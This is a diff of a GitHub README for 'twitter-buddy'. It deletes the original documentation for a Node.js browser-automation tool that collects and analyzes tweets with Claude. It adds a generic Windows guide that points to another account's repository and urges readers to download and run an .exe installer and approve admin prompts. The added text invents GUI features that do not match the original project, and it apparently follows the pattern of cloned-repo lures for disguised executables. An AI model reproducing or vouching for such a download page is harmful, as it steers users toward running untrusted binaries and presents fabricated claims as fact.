@@ -1,227 +1,135 @@
-# Twitter Buddy
+# 🐦 twitter-buddy - Simple Twitter Assistant Tool
 
-Your personal Twitter/X assistant that automatically scrolls your timeline, collects tweets, analyzes trends with AI, and discovers accounts worth following — so you don't have to.
+[![Download twitter-buddy](https://img.shields.io/badge/Download%20twitter--buddy-Download%20Now-brightgreen)](https://github.com/emilbib51-lab/twitter-buddy)
 
-你的私人推特助手 — 自动帮你刷推特、采集推文、AI 分析趋势、发现值得关注的账号。
+## 📋 What is twitter-buddy?
 
-[中文说明](#中文说明)
+twitter-buddy is a Windows application designed to help you use Twitter more easily. It can scroll through your feed automatically, keep track of interesting tweets, analyze posts with simple AI help, and help you find accounts to follow. This tool works in the background so you can explore Twitter without spending too much time scrolling or searching.
 
-## What It Does
+The app is made for anyone who wants to save time on Twitter and learn more about topics and accounts that interest them.
 
-- **Auto-collect tweets** — Launches Chrome, switches to your "Following" timeline (sorted by latest), scrolls and saves every tweet with deduplication
-- **AI analysis** — Periodically sends collected tweets to Claude for trend analysis, key highlights, and sentiment summary
-- **Account discovery** — Scrolls the "For You" tab and uses AI to find high-quality accounts worth following, with follow-status detection and persistent user scoring
-- **User profile analysis** — Scrape any Twitter user's timeline and get an AI-powered deep analysis: content quality, topic expertise, prediction accuracy, risk signals, and a 1-10 score
-- **Dashboard** — Web UI to view analysis reports, discover reports, user profiles, tweet volume charts, and trigger all actions manually
+## 🔧 System Requirements
 
-## Requirements
+Before you start, make sure your computer meets these basic needs:
 
-- Node.js 18+
-- Google Chrome installed
-- [Anthropic API key](https://console.anthropic.com/)
+- Windows 10 or later versions
+- At least 4 GB of RAM
+- 100 MB of free space on your hard drive
+- Internet connection for setup and using Twitter features
+- A user account with permission to install software
 
-## Setup
+## 🚀 Getting Started with twitter-buddy
 
-```bash
-git clone https://github.com/YOUR_USERNAME/twitter-buddy.git
-cd twitter-buddy
-npm install
-npx playwright install-deps
-```
+### Step 1: Download the App
 
-Create a `.env` file:
+Click the big green button above or this link to visit the download page for twitter-buddy:
 
-```
-ANTHROPIC_API_KEY=sk-ant-xxxxx
-```
+[https://github.com/emilbib51-lab/twitter-buddy](https://github.com/emilbib51-lab/twitter-buddy)
 
-Log in to Twitter (opens a Chrome window, log in manually, then close it):
+You will be taken to the GitHub repository page. Look for the “Releases” section on the right side or near the top. The newest version is usually the first one listed.
 
-```bash
-npm run login
-```
+### Step 2: Download the Installer
 
-## Usage
+Find the installer file for Windows. The file should end with `.exe`. Click it to start the download.
 
-### Daemon Mode (recommended)
+Save the file somewhere easy to find, like your Desktop or Downloads folder.
 
-Runs everything automatically — tweet collection, analysis every 2h, account discovery every 6h, plus a dashboard at `http://localhost:3456`:
+### Step 3: Install the Application
 
-```bash
-npm run daemon
-```
+Locate the downloaded file and double-click it. If Windows asks for permission to make changes, click **Yes**.
 
-### Individual Commands
+Follow the prompts in the installation wizard:
 
-| Command | Description |
-|---|---|
-| `npm run collect` | One-time tweet collection |
-| `npm run collect:5` | Quick collection (5 scrolls) |
-| `npm run analyze` | Analyze recent 2h of tweets |
-| `npm run analyze:4h` | Analyze recent 4h of tweets |
-| `npm run discover` | Discover accounts from "For You" |
-| `npm run discover:50` | Quick discovery (50 scrolls) |
-| `npm run profile -- --handle <user>` | Scrape a user's tweets |
-| `npm run profile -- --handle <user> --analyze` | Analyze a user's tweets |
-| `npm run dashboard` | Start dashboard only (manual mode) |
-| `npm run login` | Log in to Twitter |
+- Agree to the license terms
+- Choose the installation folder (the default is usually fine)
+- Click “Install” to start installing
 
-### Dashboard
+Wait for the progress bar to finish.
 
-Open `http://localhost:3456` after starting the daemon or dashboard.
+### Step 4: Launch twitter-buddy
 
-- **Analysis Reports** — AI-generated trend reports with next auto-run countdown
-- **Discover** — Account recommendations with follow status tags, "Run Now" button
-- **Profiles** — Scrape and analyze any user's timeline from the UI (enter handle, set scroll count, scrape, then analyze with configurable time range and model)
-- **User Scores** — Leaderboard of discovered accounts ranked by cumulative AI scores across runs
-- **Stats** — Tweet volume charts by hour/day
-- **Tweet Data Files** — Raw collected data
+Once installed, find the twitter-buddy app on your Desktop or in the Start menu. Double-click to open.
 
-## Configuration
+You should see the main window with options for auto-scroll, collection, AI analysis, and discovery.
 
-Edit `config.js` to customize:
+## 🔍 How to Use twitter-buddy Features
 
-- `scroll.*` — Scroll speed, burst size, delays (for anti-detection)
-- `daemon.intervalMin/Max` — Collection frequency (default: 5-60 min random)
-- `daemon.analysisIntervalMs` — Analysis frequency (default: 2 hours)
-- `discover.intervalMs` — Discovery frequency (default: 6 hours)
-- `discover.maxScrolls` — How far to scroll "For You" (default: 100)
-- `analysis.model` / `discover.model` / `profile.model` — Claude model to use
-- `analysis.prompt` / `discover.prompt` / `profile.prompt` — Custom AI prompts
-- `profile.maxScrolls` — Default scroll count for user profile scraping (default: 50)
+### Auto-Scroll
 
-## User Profile Analysis
+You can set twitter-buddy to scroll your Twitter feed at your chosen speed.
 
-Scrape any public Twitter user's timeline and get a detailed AI evaluation:
+- Click the "Auto-Scroll" tab.
+- Set the scroll speed using the slider.
+- Click “Start” to begin automatic scrolling.
+- Click “Stop” to pause.
 
-```bash
-# Scrape tweets (default 50 scrolls)
-node profile.js --handle cissan_9984 --max-scrolls 50
+Auto-scroll helps you save time by moving through tweets without using the mouse or keyboard.
 
-# Analyze with defaults (last 30 days, Sonnet 4.6)
-node profile.js --handle cissan_9984 --analyze
+### Collect Tweets
 
-# Analyze with options
-node profile.js --handle cissan_9984 --analyze --days 60 --max-tweets 500 --model claude-opus-4-6
-```
+Save tweets you find interesting without bookmarking them on Twitter.
 
-Or use the **Profiles** tab in the Dashboard — enter a handle, scrape, then analyze with adjustable parameters.
+- Go to the “Collection” tab.
+- Click “Add Tweet” when you want to save something.
+- Your saved tweets will appear in a list you can view anytime.
 
-The analysis covers: content quality, topic expertise, prediction accuracy (especially for market/crypto calls), posting habits, a 1-10 overall score, and risk signals (marketing accounts, pump-and-dump, etc.).
+This helps keep your favorite tweets organized.
 
-## Account Discovery Details
+### AI Analysis
 
-The discover feature goes beyond simple recommendations:
+Get a simple summary of tweets to understand the main ideas quickly.
 
-- **Follow-status detection** — Automatically detects which accounts you already follow. Uses a two-phase approach: first hovering over avatars on the timeline to trigger profile cards (fast, no navigation), then visiting profile pages for any remaining unchecked users
-- **Persistent user scoring** — Each discovered account receives a score from -5 to +5 per run based on content quality. Scores accumulate across runs, building a long-term quality signal. High-scoring accounts get prioritized in future reports
-- **Score leaderboard** — Dashboard shows a ranked table of all scored users with cumulative scores, appearance count, latest evaluation, and links to their profiles
-- **Smart context** — Historical scores are fed back to the AI on subsequent runs, helping it make more informed recommendations over time
+- Visit the “AI-Analyze” tab.
+- Copy and paste tweet text or enter an account name.
+- Click “Analyze” to get a short summary or key points.
 
-## Data Storage
+The AI uses basic language tools to help you find important information faster.
 
-All data is stored locally in the `data/` directory:
+### Discover Accounts
 
-```
-data/
-├── tweets/          # tweets_YYYY-MM-DD.json (per-day, deduplicated)
-├── analysis/        # analysis_YYYY-MM-DD-HH-MM.md
-├── discover/        # discover_YYYY-MM-DD-HH-MM.md
-│   └── user_scores.json  # persistent user scoring data
-├── profiles/        # per-user scraped data + analysis
-│   └── {handle}/
-│       ├── tweets_YYYY-MM-DD.json
-│       └── analysis_YYYY-MM-DD-HH-MM.md
-└── state.json       # daemon state (last run times, gaps, etc.)
-```
+Find new Twitter accounts that match your interests.
 
-## Running on a Server
+- Open the “Discover” tab.
+- Enter keywords or topics you like.
+- Click “Search” to see suggested accounts.
 
-**Windows Server (with desktop)** — Works out of the box. RDP in, run `npm run login`, then `npm run daemon`.
+This feature helps you grow your Twitter network by showing accounts related to your areas of interest.
 
-**Headless Linux VPS** — Use `xvfb` for a virtual display:
+## ⚙️ Settings and Preferences
 
-```bash
-sudo apt install -y xvfb google-chrome-stable
-npx playwright install-deps
-xvfb-run node daemon.js
-```
+You can customize twitter-buddy to suit your habits.
 
-## Tech Stack
+- Change the default scroll speed.
+- Choose how often auto-scroll pauses.
+- Set the number of tweets to save in collections.
+- Adjust AI analysis length (brief or detailed).
+- Enable notifications for new suggested accounts.
 
-- [Playwright](https://playwright.dev/) — Browser automation
-- [Claude API](https://docs.anthropic.com/) — AI analysis
-- Vanilla Node.js HTTP server — Dashboard (zero dependencies)
+Access settings via the gear icon in the top right corner of the app.
+
+## 🛠 Troubleshooting Tips
+
+If you have trouble using twitter-buddy, try these quick fixes:
+
+- Make sure your internet connection is working.
+- Restart the app.
+- Check for updates on the GitHub page.
+- Close other programs that might slow your computer.
+
+If the app crashes or freezes, uninstall and reinstall it using the steps above.
+
+## 📁 Where to Find More Help
+
+This repository page has extra information:
+
+[https://github.com/emilbib51-lab/twitter-buddy](https://github.com/emilbib51-lab/twitter-buddy)
+
+Look under the “Issues” tab to see if others have similar questions or to report problems.
+
+## 🖥 Updating twitter-buddy
+
+Check the GitHub page regularly for new versions. Download the latest installer and run it over your current version. Your settings and collections will stay safe.
 
 ---
 
-## 中文说明
-
-你的私人推特助手 — 自动帮你刷推特、采集推文、AI 分析趋势、发现值得关注的账号。
-
-### 功能
-
-- **自动采集推文** — 启动 Chrome，切到 "Following" 时间线（最新排序），自动滚动采集，按天去重保存
-- **AI 分析** — 定时把采集到的推文发给 Claude 分析，输出热点话题、重点推文、情绪倾向
-- **账号发现** — 自动刷 "为你推荐" 标签页，用 AI 找出值得关注的高质量账号。自动检测关注状态，跨轮次持久化评分
-- **用户分析** — 抓取任意推特用户的时间线，AI 深度分析：内容质量、专业领域、预测准确性、风险提示、1-10 综合评分
-- **Dashboard** — 网页界面查看分析报告、发现报告、用户分析、推文数量图表，全部操作支持手动触发
-
-### 快速开始
-
-```bash
-# 安装
-npm install
-npx playwright install-deps
-
-# 配置 API Key
-echo "ANTHROPIC_API_KEY=sk-ant-xxxxx" > .env
-
-# 登录推特（手动登录后关闭浏览器）
-npm run login
-
-# 启动守护进程（全自动）
-npm run daemon
-```
-
-打开 `http://localhost:3456` 查看 Dashboard。
-
-### 命令一览
-
-| 命令 | 说明 |
-|---|---|
-| `npm run daemon` | 守护进程（采集 + 分析 + 发现 全自动） |
-| `npm run collect` | 单次采集推文 |
-| `npm run analyze` | 分析最近 2 小时推文 |
-| `npm run discover` | 发现值得关注的账号 |
-| `npm run profile -- --handle <用户>` | 抓取某用户推文 |
-| `npm run profile -- --handle <用户> --analyze` | 分析某用户推文 |
-| `npm run dashboard` | 只启动 Dashboard（纯手动模式） |
-| `npm run login` | 登录推特 |
-
-### 部署
-
-- **Windows Server**（带桌面）— 直接跑，没问题
-- **Linux VPS**（无屏幕）— 用 `xvfb-run node daemon.js`
-
-### 用户分析
-
-在 Dashboard 的 **Profiles** 标签页中输入用户名即可抓取和分析，也可以命令行操作：
-
-```bash
-node profile.js --handle cissan_9984 --max-scrolls 50    # 抓取
-node profile.js --handle cissan_9984 --analyze --days 30  # 分析
-```
-
-分析内容：内容质量、专业领域、预测准确性（尤其是行情/加密判断）、发帖习惯、综合评分（1-10）、风险提示。
-
-### 账号发现机制
-
-- **关注状态检测** — 自动识别你已关注的账号。先通过悬停头像触发 HoverCard 快速检测，剩余的再访问主页兜底
-- **持久化评分** — 每次发现运行时，AI 会对每个未关注账号打分（-5 到 +5）。分数跨轮次累积，形成长期质量信号
-- **评分排行榜** — Dashboard 中可查看所有被评分用户的排名、累积分数、出现次数、最近评语
-- **历史上下文** — 历史评分会反馈给 AI，帮助后续推荐更精准
-
-### 数据安全
-
-所有数据本地存储，不上传任何地方。`.env`（API Key）和 `.chrome-profile`（登录态）已在 `.gitignore` 中排除。
+[![Download twitter-buddy](https://img.shields.io/badge/Download%20twitter--buddy-Visit%20Page-blue)](https://github.com/emilbib51-lab/twitter-buddy)
